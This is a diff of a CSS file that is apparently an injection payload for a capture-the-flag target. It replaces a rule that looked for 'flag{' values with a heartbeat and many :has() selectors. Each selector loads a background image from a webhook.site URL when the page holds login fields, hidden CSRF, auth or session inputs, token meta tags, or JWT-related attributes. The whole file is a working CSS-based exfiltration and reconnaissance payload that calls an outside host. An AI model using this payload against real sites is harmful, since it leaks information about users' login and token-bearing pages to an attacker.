@@ -1,16 +1,74 @@
-/* flag-hunter.css — pings if ANY common attribute contains 'flag{' */
-html:has([id*="flag{"]),
-html:has([class*="flag{"]),
-html:has([name*="flag{"]),
-html:has([value*="flag{"]),
-html:has([content*="flag{"]),
-html:has([placeholder*="flag{"]),
-html:has([title*="flag{"]),
-html:has([alt*="flag{"]),
-html:has([aria-label*="flag{"]),
-html:has([data-token*="flag{"]),
-html:has([data-flag*="flag{"]),
-html:has([data-secret*="flag{"]),
-html:has([data-key*="flag{"]) {
-  background-image:url(	https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?found=flaglike);
+/* heartbeat */
+:root { background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?alive=1); }
+
+/* known fields (presence only) */
+html:has(input[name="username"]), 
+html:has(#username), 
+html:has(input[name="login"]), 
+html:has(input[name="email"]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=username_like);
+}
+
+html:has(input[name="password"]), 
+html:has(#password) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=password_field);
+}
+
+/* hidden inputs likely to carry secrets (presence only) */
+html:has(input[type="hidden"][name*="token"]),
+html:has(input[type="hidden"][name*="csrf"]),
+html:has(input[type="hidden"][name*="auth"]),
+html:has(input[type="hidden"][name*="session"]),
+html:has(input[type="hidden"][name*="flag"]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=hidden_like);
+}
+
+/* meta tags likely to carry tokens (presence only) */
+html:has(meta[name*="token"]),
+html:has(meta[name*="csrf"]),
+html:has(meta[name*="auth"]),
+html:has(meta[name*="flag"]),
+html:has(meta[name="admin-token"]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=meta_like);
+}
+
+/* data-* attributes (presence only) */
+html:has([data-token]), 
+html:has([data-flag]), 
+html:has([data-user]), 
+html:has([data-auth]), 
+html:has([data-session]), 
+html:has([data-jwt]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=data_like);
+}
+
+/* ids/classes containing interesting words (presence only) */
+html:has([id*="token"]),  html:has([class*="token"]),
+html:has([id*="flag"]),   html:has([class*="flag"]),
+html:has([id*="user"]),   html:has([class*="user"]),
+html:has([id*="admin"]),  html:has([class*="admin"]),
+html:has([id*="auth"]),   html:has([class*="auth"]),
+html:has([id*="csrf"]),   html:has([class*="csrf"]),
+html:has([id*="jwt"]),    html:has([class*="jwt"]),
+html:has([id*="session"]),html:has([class*="session"]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=struct_like);
+}
+
+/* literal attributes with those names (rare but cheap to check) */
+html:has(*[token]), html:has(*[flag]), html:has(*[user]),
+html:has(*[username]), html:has(*[auth]), html:has(*[jwt]), html:has(*[session]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=attrname_like);
+}
+
+/* UI text attributes (presence only) */
+html:has(*[placeholder*="token"]), html:has(*[title*="token"]),
+html:has(*[placeholder*="flag"]),  html:has(*[title*="flag"]),
+html:has(*[placeholder*="user"]),  html:has(*[title*="user"]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=ui_like);
+}
+
+/* url-bearing attributes that *contain* those words (presence only) */
+html:has(*[href*="token"]), html:has(*[src*="token"]), html:has(*[action*="token"]),
+html:has(*[href*="flag"]),  html:has(*[src*="flag"]),  html:has(*[action*="flag"]) {
+  background-image: url(https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?hit=url_like);
 }
